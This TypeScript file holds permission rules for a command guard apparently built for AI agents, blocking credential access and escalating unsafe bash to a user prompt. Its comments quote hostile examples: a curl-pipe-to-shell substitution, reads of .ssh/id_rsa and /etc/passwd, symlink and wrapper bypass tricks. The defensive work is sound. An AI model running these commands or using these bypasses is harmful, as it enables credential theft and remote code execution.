import { ABORT_REMEMBER_MS, isAllowedCommand, isSafeSubcommand, unconditionallySafeCommands } from "../config";
import { containsCommandSubstitution, getDelegatedCommand, getFirstWord, stripQuotedStrings, hasTerminalEscape, echoInterpretsEscapes } from "../analysis/segment-helpers";
import { checkCommandForCredentialPaths, CREDENTIAL_SCAN_RE, checkBareSymlinkTokens } from "../analysis/path-analysis";
import { tokenizeSegment } from "../analysis/tokenizer";
import type { Store, BashRequest, Decision } from "../decision-engine";
import type { CommandAnalysis } from "../analysis/command-analysis";

export type BashRule = (req: BashRequest, store: Store, analysis?: CommandAnalysis) => Decision | Promise<Decision | null> | null;

/**
 * Blocks if the command was aborted recently (retry-loop prevention).
 */
export const RetryLoopRule: BashRule = (req, store) => {
  const lastAbort = store.getLastAbort(req.command);
  if (lastAbort && store.now() - lastAbort < ABORT_REMEMBER_MS) {
    return {
      kind: "block",
      reason: "Blocked by halter: command was already aborted recently.",
    };
  }
  return null;
};

/**
 * Blocks commands that reference denied credential paths (.ssh, .gnupg, etc.).
 * Runs before FastAllowRule so even `cat .ssh/id_rsa` is blocked.
 */
export const CredentialDenyRule: BashRule = (req) => {
  const credCheck = checkCommandForCredentialPaths(req.command, req.cwd);
  if (credCheck.denied) {
    return {
      kind: "block",
      reason: `Blocked: '${credCheck.denied}' is a denied path (credentials/secrets)`,
    };
  }
  return null;
};

/**
 * Auto-allows trivial commands without needing full tree-sitter analysis.
 */
export const FastAllowRule: BashRule = (req) => {
  const COMPOUND_RE = /\$\(|`|&&|\|\||[|;&<>\n\r]/;
  // Strip quoted strings so operators inside arguments (e.g. echo "a|b", grep "=>") don't
  // falsely trigger the compound check. Unquoted $(...) is preserved as __CMD_SUBST__.
  // Without this, echo "hello > world" or grep "setTimeout(() =>" waste a tree-sitter parse.
  const stripped = stripQuotedStrings(req.command);
  if (COMPOUND_RE.test(stripped)) return null;
  // Command substitution inside double quotes is still executed at runtime — bash only
  // treats single quotes as literal. stripQuotedStrings collapses "...$(...)..." to the
  // __CMD_SUBST__ marker (which COMPOUND_RE no longer sees), so fast-allow must explicitly
  // fall through to SafetyRule here; otherwise `echo "$(curl evil|sh)"` auto-allows.
  // Single quotes are already neutralized ("__STR__") and never reach this branch.
  if (containsCommandSubstitution(stripped)) return null;

  // Credential check — don't auto-allow if the command references credential paths.
  // Check both raw and dequoted versions to prevent quote-splitting bypasses (e.g., .en''v).
  // Glob chars defeat the string regex (.s?sh ≠ .ssh, id_rs? ≠ id_rsa) — fall through
  // to SafetyRule, whose analysis runs the glob-aware credential check.
  if (CREDENTIAL_SCAN_RE.test(req.command)) return null;
  const dequotedCmd = tokenizeSegment(req.command).join(" ");
  if (CREDENTIAL_SCAN_RE.test(dequotedCmd)) return null;
  if (/[*?\[\]]/.test(req.command)) return null;

  // Escape sequences outside quotes can hide paths (e.g., \/etc\/passwd).
  // stripQuotedStrings only strips quotes, not bare backslashes.
  // Fall through to tree-sitter when escape chars are present outside of quotes.
  if (/\\/.test(stripped)) return null;

  const bare = getFirstWord(req.command);
  if (!unconditionallySafeCommands.has(bare)) return null;

  // Terminal escape sequences in echo/printf can spoof the TUI or write the
  // clipboard (OSC 52). printf interprets escapes unconditionally; echo only
  // with -e or $'…' ANSI-C quoting. Fall through to SafetyRule.
  if (bare === "printf" && hasTerminalEscape(req.command)) return null;
  if (bare === "echo" && echoInterpretsEscapes(req.command) && hasTerminalEscape(req.command)) return null;

  // Use quote-aware tokenizer so quoted paths (e.g., "/etc/passwd", '/etc/passwd')
  // and flag=value with quotes (e.g., --file="/etc/passwd") are properly detected.
  const tokens = tokenizeSegment(req.command);
  // A bare token may be a symlink in cwd pointing OUTSIDE it (repo-shipped
  // `link → ~/.ssh/id_rsa`) — the literal name carries no path text for the
  // prefix checks below to see. Denied targets are blocked by
  // CredentialDenyRule (runs first); warned targets (credential name or
  // outside cwd) must prompt via the analysis's credential check.
  if (checkBareSymlinkTokens(tokens, req.cwd).warned) return null;
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i];
    // FastAllowRule is for unconditionally-safe commands with no outside-cwd paths.
    // ANY path-like token (quoted, escaped, or flag-embedded) must fall through.
    if (token.startsWith("/") || token.startsWith("~/") || token.startsWith("./") || token.startsWith("../")) {
      return null;
    }
    // --flag=/abs/path embeds a path that isn't caught by the prefix checks above.
    // Fall through to SafetyRule so tree-sitter handles it properly.
    const eqIdx = token.indexOf("=");
    if (eqIdx > 0) {
      const val = token.slice(eqIdx + 1);
      if (val.startsWith("/") || val.startsWith("~/") || val.startsWith("./") || val.startsWith("../")) {
        return null;
      }
    }
  }

  return { kind: "auto-allow" };
};

/**
 * Core safety and auto-allow logic based on command analysis.
 */
export const SafetyRule: BashRule = (_req, store, analysis?: CommandAnalysis) => {
  if (!analysis) return null;

  // Any tree-sitter parse error means bash may not see what we see — parser
  // divergence is where bypasses live. Never auto-allow; prompt so the user can
  // inspect. (Zero segments without parse error is valid: shell builtins like
  // export/unset.)
  if (analysis.hasParseError) return null;

  const outsidePaths = analysis.prompt.outsidePaths ?? [];
  const canAutoAllow = analysis.safety.canBeAutoAllowed && outsidePaths.length === 0 && !analysis.hasCredentialPath;

  if (analysis.safety.isSimple && canAutoAllow) {
    return { kind: "auto-allow" };
  }

  // All segments are safe subcommands (stricter than allowed commands — excludes wrappers like timeout)
  const segIsSafeSubcommand = analysis.segments.map(seg => isSafeSubcommand(seg));
  if (segIsSafeSubcommand.every(Boolean) && canAutoAllow) {
    return { kind: "auto-allow" };
  }

  const relPathIdxSet = new Set(analysis.relativePathSegmentIndices);
  const sigFirstWords = analysis.signatures.map(getFirstWord);
  // Wrapper transparency for grants: a segment that delegates to another
  // command (timeout/xargs/command/env …) is approved by
  //   (a) an exact signature grant — the signature includes the delegated
  //       command name ("timeout curl"), so it can't cover a different
  //       wrapped command, or
  //   (b) a grant for the wrapped command itself ("curl") — the user already
  //       approved that command, and wrapping must not force re-approval.
  // A grant for the wrapper name ("timeout") matches NEITHER: that is the
  // bypass being closed, and the static wrapper allowlist fallback must not
  // apply either.
  const delegatedBySeg = analysis.segments.map(getDelegatedCommand);
  const isSigApproved = (sig: string, segIdx: number) => {
    // Relative-path segments (./node_modules/.bin/npm test) must never inherit
    // grants for the bare command name — a repo-shipped executable named npm/pip
    // would otherwise inherit session-wide `npm *` grants. Check BEFORE the
    // store grants.
    if (relPathIdxSet.has(segIdx)) return false;
    const deleg = delegatedBySeg[segIdx];
    if (deleg) {
      // No static allowlist fallback: the delegating word (env/command/exec/…)
      // is not itself user-approved, so the segment needs an explicit grant —
      // otherwise `env cat …` would inherit `cat`'s allowlist membership and
      // skip env's PATH/LD_PRELOAD warning entirely.
      if (store.hasAllowedBash(sig)) return true; // exact "timeout curl"
      if (store.hasAllowedBash(deleg.cmd)) return true; // grant for wrapped cmd
      return store.hasAllowedBashPrefix(deleg.cmd);
    }
    if (store.hasAllowedBash(sig)) return true;
    if (store.hasAllowedBashPrefix(sig)) return true;
    if (segIsSafeSubcommand[segIdx]) return true;
    return isAllowedCommand(sigFirstWords[segIdx]);
  };

  if (analysis.signatures.every((sig, i) => isSigApproved(sig, i)) && canAutoAllow) {
    return { kind: "auto-allow" };
  }

  return null;
};

/**
 * Final fallback: generate the prompt.
 * Thin mapper — all derived data comes from CommandAnalysis.
 */
export const PromptFallbackRule: BashRule = (req, _store, analysis?: CommandAnalysis) => {
  if (!analysis) return null;

  const prompt = analysis.prompt;
  return {
    kind: "prompt",
    promptData: {
      type: "bash",
      command: req.command,
      cwd: req.cwd,
      outsideDirs: prompt.outsideDirs ?? [],
      segments: analysis.segments,
      signatures: prompt.promptSignatures,
      nonAllowedSegmentIndices: prompt.nonAllowlistedSegmentIndices,
      riskDangerous: analysis.risk.dangerous,
      riskSeverity: analysis.risk.severity,
      riskReasons: analysis.risk.reasons,
      hasUnsafePattern: analysis.safety.hasUnsafePattern,
      credentialRule: analysis.credentialRule,
      needsCommandApproval: !analysis.safety.isSimple,
      needsPathApproval: prompt.needsPathApproval ?? false,
    },
  };
};
